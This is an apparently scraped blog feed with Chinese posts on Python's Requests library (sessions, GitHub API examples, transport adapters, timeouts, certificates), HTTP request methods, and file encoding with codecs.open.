<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">if</span> (r.status_code == requests.codes.ok):</div><div class="line"><span class="meta">... </span>    <span class="keyword">print</span> r.headers[<span class="string">'content-type'</span>]</div><div class="line">...</div><div class="line">application/json; charset=utf<span class="number">-8</span></div></pre></td></tr></table></figure>
<p>可见，GitHub返回了JSON数据，非常好，这样就可以使用 <strong>r.json</strong> 方法把这个返回的数据解析成Python对象。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>commit_data = r.json()</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> commit_data.keys()</div><div class="line">[<span class="string">u'committer'</span>, <span class="string">u'author'</span>, <span class="string">u'url'</span>, <span class="string">u'tree'</span>, <span class="string">u'sha'</span>, <span class="string">u'parents'</span>, <span class="string">u'message'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> commit_data[<span class="string">u'committer'</span>]</div><div class="line">&#123;<span class="string">u'date'</span>: <span class="string">u'2012-05-10T11:10:50-07:00'</span>, <span class="string">u'email'</span>: <span class="string">u'me@kennethreitz.com'</span>, <span class="string">u'name'</span>: <span class="string">u'Kenneth Reitz'</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> commit_data[<span class="string">u'message'</span>]</div><div class="line">makin<span class="string">' history</span></div></pre></td></tr></table></figure>
<p>到目前为止，一切都非常简单。嗯，我们来研究一下GitHub的API。我们可以去看看文档， 但如果使用Requests来研究也许会更有意思一点。我们可以借助Requests的OPTIONS请求类型来看看我们刚使用过的url 支持哪些HTTP方法。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>verbs = requests.options(r.url)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>verbs.status_code</div><div class="line"><span class="number">500</span></div></pre></td></tr></table></figure>
<p>额，这是怎么回事？毫无帮助嘛！原来GitHub，与许多API提供方一样，实际上并未实现OPTIONS方法。 这是一个恼人的疏忽，但没关系，那我们可以使用枯燥的文档。然而，如果GitHub正确实现了OPTIONS， 那么服务器应该在响应头中返回允许用户使用的HTTP方法，例如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>verbs = requests.options(<span class="string">'http://a-good-website.com/api/cats'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> verbs.headers[<span class="string">'allow'</span>]</div><div class="line">GET,HEAD,POST,OPTIONS</div></pre></td></tr></table></figure>
<p>转而去查看文档，我们看到对于提交信息，另一个允许的方法是POST，它会创建一个新的提交。 由于我们正在使用Requests代码库，我们应尽可能避免对它发送笨拙的POST。作为替代，我们来 玩玩GitHub的Issue特性。</p>
<p>本篇文档是回应<em>Issue #482</em>而添加的。鉴于该问题已经存在，我们就以它为例。先获取它。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'https://api.github.com/repos/kennethreitz/requests/issues/482'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</div><div class="line"><span class="number">200</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>issue = json.loads(r.text)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> issue[<span class="string">u'title'</span>]</div><div class="line">Feature any http verb <span class="keyword">in</span> docs</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> issue[<span class="string">u'comments'</span>]</div><div class="line"><span class="number">3</span></div></pre></td></tr></table></figure>
<p>Cool，有3个评论。我们来看一下最后一个评论。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(r.url + <span class="string">u'/comments'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</div><div class="line"><span class="number">200</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>comments = r.json()</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> comments[<span class="number">0</span>].keys()</div><div class="line">[<span class="string">u'body'</span>, <span class="string">u'url'</span>, <span class="string">u'created_at'</span>, <span class="string">u'updated_at'</span>, <span class="string">u'user'</span>, <span class="string">u'id'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> comments[<span class="number">2</span>][<span class="string">u'body'</span>]</div><div class="line">Probably <span class="keyword">in</span> the <span class="string">"advanced"</span> section</div></pre></td></tr></table></figure>
<p>嗯，那看起来似乎是个愚蠢之处。我们发表个评论来告诉这个评论者他自己的愚蠢。那么，这个评论者是谁呢？</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> comments[<span class="number">2</span>][<span class="string">u'user'</span>][<span class="string">u'login'</span>]</div><div class="line">kennethreitz</div></pre></td></tr></table></figure>
<p>好，我们来告诉这个叫肯尼思的家伙，这个例子应该放在快速上手指南中。根据GitHub API文档， 其方法是POST到该话题。我们来试试看。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>body = json.dumps(&#123;<span class="string">u"body"</span>: <span class="string">u"Sounds great! I'll get right on it!"</span>&#125;)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">u"https://api.github.com/repos/kennethreitz/requests/issues/482/comments"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url=url, data=body)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</div><div class="line"><span class="number">404</span></div></pre></td></tr></table></figure>
<p>额，这有点古怪哈。可能我们需要验证身份。那就有点纠结了，对吧？不对。Requests简化了多种身份验证形式的使用， 包括非常常见的Basic Auth。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>auth = HTTPBasicAuth(<span class="string">'fake@example.com'</span>, <span class="string">'not_a_real_password'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url=url, data=body, auth=auth)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</div><div class="line"><span class="number">201</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>content = r.json()</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>print(content[<span class="string">u'body'</span>])</div><div class="line">Sounds great! I<span class="string">'ll get right on it.</span></div></pre></td></tr></table></figure>
<p>精彩！噢，不！我原本是想说等我一会，因为我得去喂一下我的猫。如果我能够编辑这条评论那就好了！ 幸运的是，GitHub允许我们使用另一个HTTP动词，PATCH，来编辑评论。我们来试试。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>print(content[<span class="string">u"id"</span>])</div><div class="line"><span class="number">5804413</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>body = json.dumps(&#123;<span class="string">u"body"</span>: <span class="string">u"Sounds great! I'll get right on it once I feed my cat."</span>&#125;)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">u"https://api.github.com/repos/kennethreitz/requests/issues/comments/5804413"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.patch(url=url, data=body, auth=auth)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</div><div class="line"><span class="number">200</span></div></pre></td></tr></table></figure>
<p>非常好。现在，我们来折磨一下这个叫肯尼思的家伙，我决定要让他急得团团转，也不告诉他是我在捣蛋。 这意味着我想删除这条评论。GitHub允许我们使用完全名副其实的DELETE方法来删除评论。我们来清除该评论。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.delete(url=url, auth=auth)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</div><div class="line"><span class="number">204</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.headers[<span class="string">'status'</span>]</div><div class="line"><span class="string">'204 No Content'</span></div></pre></td></tr></table></figure>
<p>很好。不见了。最后一件我想知道的事情是我已经使用了多少限额（ratelimit）。查查看，GitHub在响应头部发送这个信息， 因此不必下载整个网页，我将使用一个HEAD请求来获取响应头。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.head(url=url, auth=auth)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> r.headers</div><div class="line">...</div><div class="line"><span class="string">'x-ratelimit-remaining'</span>: <span class="string">'4995'</span></div><div class="line"><span class="string">'x-ratelimit-limit'</span>: <span class="string">'5000'</span></div><div class="line">...</div></pre></td></tr></table></figure>
<p>很好。是时候写个Python程序以各种刺激的方式滥用GitHub的API，还可以使用4995次呢。</p>
<hr>
<h2 id="响应头链接字段"><a href="#响应头链接字段" class="headerlink" title="响应头链接字段"></a>响应头链接字段</h2><hr>
<p>许多HTTP API都有响应头链接字段的特性，它们使得API能够更好地自我描述和自我显露。</p>
<p>GitHub在API中为 <a href="http://developer.github.com/v3/#pagination" target="_blank" rel="external">分页</a> 使用这些特性，例如:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'https://api.github.com/users/kennethreitz/repos?page=1&amp;per_page=10'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.head(url=url)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.headers[<span class="string">'link'</span>]</div><div class="line"><span class="string">'&lt;https://api.github.com/users/kennethreitz/repos?page=2&amp;per_page=10&gt;; rel="next", &lt;https://api.github.com/users/kennethreitz/repos?page=6&amp;per_page=10&gt;; rel="last"'</span></div></pre></td></tr></table></figure>
<p>Requests会自动解析这些响应头链接字段，并使得它们非常易于使用:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.links[<span class="string">"next"</span>]</div><div class="line">&#123;<span class="string">'url'</span>: <span class="string">'https://api.github.com/users/kennethreitz/repos?page=2&amp;per_page=10'</span>, <span class="string">'rel'</span>: <span class="string">'next'</span>&#125;</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.links[<span class="string">"last"</span>]</div><div class="line">&#123;<span class="string">'url'</span>: <span class="string">'https://api.github.com/users/kennethreitz/repos?page=7&amp;per_page=10'</span>, <span class="string">'rel'</span>: <span class="string">'last'</span>&#125;</div></pre></td></tr></table></figure>
<hr>
<h2 id="Transport-Adapters"><a href="#Transport-Adapters" class="headerlink" title="Transport Adapters"></a>Transport Adapters</h2><hr>
<p>As of v1.0.0, Requests has moved to a modular internal design. Part of the reason this was done was to implement Transport Adapters, originally <a href="http://www.kennethreitz.org/essays/the-future-of-python-http" target="_blank" rel="external">described here</a>. Transport Adapters provide a mechanism to define interaction methods for an HTTP service. In particular, they allow you to apply per-service configuration.</p>
<p>Requests ships with a single Transport Adapter, the HTTPAdapter. This adapter provides the default Requests interaction with HTTP and HTTPS using the powerful <a href="https://github.com/shazow/urllib3" target="_blank" rel="external">urllib3</a> library. Whenever a Requests <a href="http://cn.python-requests.org/zh_CN/latest/api.html#requests.Session" target="_blank" rel="external">Session</a> is initialized, one of these is attached to the <a href="http://cn.python-requests.org/zh_CN/latest/api.html#requests.Session" target="_blank" rel="external">Session</a> object for HTTP, and one for HTTPS.</p>
<p>Requests enables users to create and use their own Transport Adapters that provide specific functionality. Once created, a Transport Adapter can be mounted to a Session object, along with an indication of which web services it should apply to.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>s = requests.Session()</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s.mount(<span class="string">'http://www.github.com'</span>, MyAdapter())</div></pre></td></tr></table></figure>
<p>The mount call registers a specific instance of a Transport Adapter to a prefix. Once mounted, any HTTP request made using that session whose URL starts with the given prefix will use the given Transport Adapter.</p>
<p>Many of the details of implementing a Transport Adapter are beyond the scope of this documentation, but take a look at the next example for a simple SSL use- case. For more than that, you might look at subclassing <em>requests.adapters.BaseAdapter</em>.</p>
<h3 id="Example-Specific-SSL-Version"><a href="#Example-Specific-SSL-Version" class="headerlink" title="Example: Specific SSL Version"></a>Example: Specific SSL Version</h3><p>The Requests team has made a specific choice to use whatever SSL version is default in the underlying library (<a href="https://github.com/shazow/urllib3" target="_blank" rel="external">urllib3</a>). Normally this is fine, but from time to time, you might find yourself needing to connect to a service-endpoint that uses a version that isn’t compatible with the default.</p>
<p>You can use Transport Adapters for this by taking most of the existing implementation of HTTPAdapter, and adding a parameter <em>ssl_version</em> that gets passed-through to <em>urllib3</em>. We’ll make a TA that instructs the library to use SSLv3:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> ssl</div><div class="line"></div><div class="line"><span class="keyword">from</span> requests.adapters <span class="keyword">import</span> HTTPAdapter</div><div class="line"><span class="keyword">from</span> requests.packages.urllib3.poolmanager <span class="keyword">import</span> PoolManager</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ssl3HttpAdapter</span><span class="params">(HTTPAdapter)</span>:</span></div><div class="line">    <span class="string">""""Transport adapter" that allows us to use SSLv3."""</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">init_poolmanager</span><span class="params">(self, connections, maxsize, block=False)</span>:</span></div><div class="line">        self.poolmanager = PoolManager(num_pools=connections,</div><div class="line">                                       maxsize=maxsize,</div><div class="line">                                       block=block,</div><div class="line">                                       ssl_version=ssl.PROTOCOL_SSLv3)</div></pre></td></tr></table></figure>
<hr>
<h2 id="Blocking-Or-Non-Blocking"><a href="#Blocking-Or-Non-Blocking" class="headerlink" title="Blocking Or Non-Blocking?"></a>Blocking Or Non-Blocking?</h2><hr>
<p>With the default Transport Adapter in place, Requests does not provide any kind of non-blocking IO. The <a href="http://cn.python-requests.org/zh_CN/latest/api.html#requests.Response.content" target="_blank" rel="external"><strong>Response.content</strong></a> property will block until the entire response has been downloaded. If you require more granularity, the streaming features of the library (see <a href="http://cn.python-requests.org/zh_CN/latest/user/advanced.html#streaming-requests" target="_blank" rel="external">流式请求</a>) allow you to retrieve smaller quantities of the response at a time. However, these calls will still block.</p>
<p>If you are concerned about the use of blocking IO, there are lots of projects out there that combine Requests with one of Python’s asynchronicity frameworks. Two excellent examples are <a href="https://github.com/kennethreitz/grequests" target="_blank" rel="external">grequests</a> and <a href="https://github.com/ross/requests-futures" target="_blank" rel="external">requests-futures</a>.</p>
<hr>
<h2 id="Timeouts"><a href="#Timeouts" class="headerlink" title="Timeouts"></a>Timeouts</h2><hr>
<p>Most requests to external servers should have a timeout attached, in case the server is not responding in a timely manner. Without a timeout, your code may hang for minutes or more.</p>
<p>The connect timeout is the number of seconds Requests will wait for your client to establish a connection to a remote machine (corresponding to the <a href="http://linux.die.net/man/2/connect" target="_blank" rel="external">connect()</a>) call on the socket. It’s a good practice to set connect timeouts to slightly larger than a multiple of 3, which is the default <a href="http://www.hjp.at/doc/rfc/rfc2988.txt" target="_blank" rel="external">TCP packet retransmission window</a>.</p>
<p>Once your client has connected to the server and sent the HTTP request, the read timeout is the number of seconds the client will wait for the server to send a response. (Specifically, it’s the number of seconds that the client will wait between bytes sent from the server. In 99.9% of cases, this is the time before the server sends the first byte).</p>
<p>If you specify a single value for the timeout, like this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">r = requests.get(<span class="string">'https://github.com'</span>, timeout=<span class="number">5</span>)</div></pre></td></tr></table></figure>
<p>The timeout value will be applied to both the connect and the read timeouts. Specify a tuple if you would like to set the values separately:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">r = requests.get(<span class="string">'https://github.com'</span>, timeout=(<span class="number">3.05</span>, <span class="number">27</span>))</div></pre></td></tr></table></figure>
<p>If the remote server is very slow, you can tell Requests to wait forever for a response, by passing None as a timeout value and then retrieving a cup of coffee.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">r = requests.get(<span class="string">'https://github.com'</span>, timeout=<span class="keyword">None</span>)</div></pre></td></tr></table></figure>
<hr>
<h2 id="CA-Certificates"><a href="#CA-Certificates" class="headerlink" title="CA Certificates"></a>CA Certificates</h2><hr>
<p>By default Requests bundles a set of root CAs that it trusts, sourced from the <a href="https://hg.mozilla.org/mozilla-central/raw-file/tip/security/nss/lib/ckfw/builtins/certdata.txt" target="_blank" rel="external">Mozilla trust store</a>. However, these are only updated once for each Requests version. This means that if you pin a Requests version your certificates can become extremely out of date.</p>
<p>From Requests version 2.4.0 onwards, Requests will attempt to use certificates from <a href="http://certifi.io/" target="_blank" rel="external">certifi</a> if it is present on the system. This allows for users to update their trusted certificates without having to change the code that runs on their system.</p>
<p>For the sake of security we recommend upgrading certifi frequently!</p>
<hr>
<blockquote>
<p><strong>说明：前面有些官方文档没翻译到的，我自己翻译了，后一部分，时间太晚了，是在没精力了，以后有时间再翻译，可能我翻译的有些语句不通顺，但是还是能大概表达出意思的，如果你对比了官方文档，觉得你可以翻译得更好，可以私信或留言我哦</strong></p>
<p><strong>想喷我的人也省省吧，的确，这篇文章和之前的一篇Requests安装使用都是我从官网移植过来的，但是我花时间翻译了一部分，排版也废了番功夫，使用MarkDown写成，需要源md文档也可以找我索要，本文随意传播</strong></p>
<hr>
<p><strong>我是Akkuman，同道人可以和我一起交流哦，私信或留言均可,我的博客hacktech.cn | 53xiaoshuo.com</strong></p>
<hr>
</blockquote>
]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
&lt;h1 id=&quot;高级用法&quot;&gt;&lt;a href=&quot;#高级用法&quot; class=&quot;headerlink&quot; title=&quot;高级用法&quot;&gt;&lt;/a&gt;高级用法&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;本篇文档涵盖了Requests的一些更加高级的特性。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;会话对象&quot;&gt;&lt;a href=&quot;#会话对象&quot; class=&quot;headerlink&quot; title=&quot;会话对象&quot;&gt;&lt;/a&gt;会话对象&lt;/h2&gt;&lt;hr&gt;
&lt;p&gt;会话对象让你能够跨请求保持某些参数。它也会在同一个Session实例发出的所有请求之间保持cookies。&lt;/p&gt;
&lt;p&gt;会话对象具有主要的Requests API的所有方法。&lt;/p&gt;
&lt;p&gt;我们来跨请求保持一些cookies:&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;s = requests.Session()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;s.get(&lt;span class=&quot;string&quot;&gt;&#39;http://httpbin.org/cookies/set/sessioncookie/123456789&#39;&lt;/span&gt;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;r = s.get(&lt;span class=&quot;string&quot;&gt;&quot;http://httpbin.org/cookies&quot;&lt;/span&gt;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;print(r.text)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# &#39;&amp;#123;&quot;cookies&quot;: &amp;#123;&quot;sessioncookie&quot;: &quot;123456789&quot;&amp;#125;&amp;#125;&#39;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Python" scheme="http://hacktech.cn/categories/Python/"/>
    
    
      <category term="Python" scheme="http://hacktech.cn/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>HTTP协议请求类型介绍</title>
    <link href="http://hacktech.cn/2016/06/10/HTTP%E5%8D%8F%E8%AE%AE%E8%AF%B7%E6%B1%82%E7%B1%BB%E5%9E%8B%E4%BB%8B%E7%BB%8D/"/>
    <id>http://hacktech.cn/2016/06/10/HTTP协议请求类型介绍/</id>
    <published>2016-06-09T17:39:13.000Z</published>
    <updated>2016-06-09T17:40:01.292Z</updated>
    
    <content type="html"><![CDATA[<hr>
<p><strong>HTTP协议中共定义了八种方法或者叫“动作”来表明对Request-URI指定的资源的不同操作方式，具体介绍如下：</strong></p>
<hr>
<h1 id="OPTIONS："><a href="#OPTIONS：" class="headerlink" title="OPTIONS："></a>OPTIONS：</h1><p>返回服务器针对特定资源所支持的HTTP请求方法。也可以利用向Web服务器发送’*’的请求来测试服务器的功能性。</p>
<h1 id="HEAD："><a href="#HEAD：" class="headerlink" title="HEAD："></a>HEAD：</h1><p>向服务器索要与GET请求相一致的响应，只不过响应体将不会被返回。这一方法可以在不必传输整个响应内容的情况下，就可以获取包含在响应消息头中的元信息。</p>
<h1 id="GET："><a href="#GET：" class="headerlink" title="GET："></a>GET：</h1><p>向特定的资源发出请求。<br><a id="more"></a></p>
<h1 id="POST："><a href="#POST：" class="headerlink" title="POST："></a>POST：</h1><p>向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的创建和/或已有资源的修改。 </p>
<h1 id="PUT："><a href="#PUT：" class="headerlink" title="PUT："></a>PUT：</h1><p>向指定资源位置上传其最新内容。 </p>
<h1 id="DELETE："><a href="#DELETE：" class="headerlink" title="DELETE："></a>DELETE：</h1><p>请求服务器删除Request-URI所标识的资源。 </p>
<h1 id="TRACE："><a href="#TRACE：" class="headerlink" title="TRACE："></a>TRACE：</h1><p>回显服务器收到的请求，主要用于测试或诊断。 </p>
<h1 id="CONNECT："><a href="#CONNECT：" class="headerlink" title="CONNECT："></a>CONNECT：</h1><p>HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。</p>
<hr>
<p><strong>虽然HTTP的请求方式有8种，但是我们在实际应用中常用的也就是get和post，其他请求方式也都可以通过这两种方式间接的来实现。</strong></p>
<hr>
<p>转载自：<a href="http://www.xuebuyuan.com/1586750.html" target="_blank" rel="external">http://www.xuebuyuan.com/1586750.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
&lt;p&gt;&lt;strong&gt;HTTP协议中共定义了八种方法或者叫“动作”来表明对Request-URI指定的资源的不同操作方式，具体介绍如下：&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&quot;OPTIONS：&quot;&gt;&lt;a href=&quot;#OPTIONS：&quot; class=&quot;headerlink&quot; title=&quot;OPTIONS：&quot;&gt;&lt;/a&gt;OPTIONS：&lt;/h1&gt;&lt;p&gt;返回服务器针对特定资源所支持的HTTP请求方法。也可以利用向Web服务器发送’*’的请求来测试服务器的功能性。&lt;/p&gt;
&lt;h1 id=&quot;HEAD：&quot;&gt;&lt;a href=&quot;#HEAD：&quot; class=&quot;headerlink&quot; title=&quot;HEAD：&quot;&gt;&lt;/a&gt;HEAD：&lt;/h1&gt;&lt;p&gt;向服务器索要与GET请求相一致的响应，只不过响应体将不会被返回。这一方法可以在不必传输整个响应内容的情况下，就可以获取包含在响应消息头中的元信息。&lt;/p&gt;
&lt;h1 id=&quot;GET：&quot;&gt;&lt;a href=&quot;#GET：&quot; class=&quot;headerlink&quot; title=&quot;GET：&quot;&gt;&lt;/a&gt;GET：&lt;/h1&gt;&lt;p&gt;向特定的资源发出请求。&lt;br&gt;
    
    </summary>
    
      <category term="Web" scheme="http://hacktech.cn/categories/Web/"/>
    
    
      <category term="HTTP" scheme="http://hacktech.cn/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>Python中的open和codecs.open</title>
    <link href="http://hacktech.cn/2016/06/10/Python%E4%B8%AD%E7%9A%84open%E5%92%8Ccodecs-open/"/>
    <id>http://hacktech.cn/2016/06/10/Python中的open和codecs-open/</id>
    <published>2016-06-09T17:26:22.000Z</published>
    <updated>2016-06-09T17:41:46.049Z</updated>
    
    <content type="html"><![CDATA[<p>最近老被编码困扰，多次折腾之后，感觉python的编解码做得挺好的，只要了解<strong>下边的流程，一般都能解决</strong></p>
<p><strong>input文件(gbk, utf-8…)   —-decode—–&gt;   unicode  ——-encode——&gt; output文件(gbk, utf-8…)</strong><br>很多文本挖掘的package是在unicode上边做事的，比如nltk. 所以开始读入文件后要decode为unicode格式，可以通过下边两步：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">f=open(<span class="string">'XXXXX'</span>, <span class="string">'r'</span>)</div><div class="line">content=f.read().decode(<span class="string">'utf-8'</span>)</div></pre></td></tr></table></figure></p>
<p>更好的方法是使用codecs.open读入时直接解码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">f=codecs.open(XXX, encoding=<span class="string">'utf-8'</span>)</div><div class="line">content=f.read()</div></pre></td></tr></table></figure></p>
<p>转自: <a href="http://f.dataguru.cn/thread-237116-1-1.html" target="_blank" rel="external">http://f.dataguru.cn/thread-237116-1-1.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近老被编码困扰，多次折腾之后，感觉python的编解码做得挺好的，只要了解&lt;strong&gt;下边的流程，一般都能解决&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;input文件(gbk, utf-8…)   —-decode—–&amp;gt;   unicode  ——-en
    
    </summary>
    
      <category term="Python" scheme="http://hacktech.cn/categories/Python/"/>
    
    
      <category term="Python" scheme="http://hacktech.cn/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python之Requests的安装与基本使用</title>
    <link href="http://hacktech.cn/2016/06/09/Python%E4%B9%8BRequests%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <id>http://hacktech.cn/2016/06/09/Python之Requests的安装与基本使用/</id>
    <published>2016-06-09T15:23:36.000Z</published>
    <updated>2016-06-09T17:08:50.890Z</updated>
    
    <content type="html"><![CDATA[<hr>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><hr>
<p>使用 pip 安装Requests非常简单<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install requests</div></pre></td></tr></table></figure></p>
<p>或者使用 easy_install 安装<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">easy_install requests</div></pre></td></tr></table></figure></p>
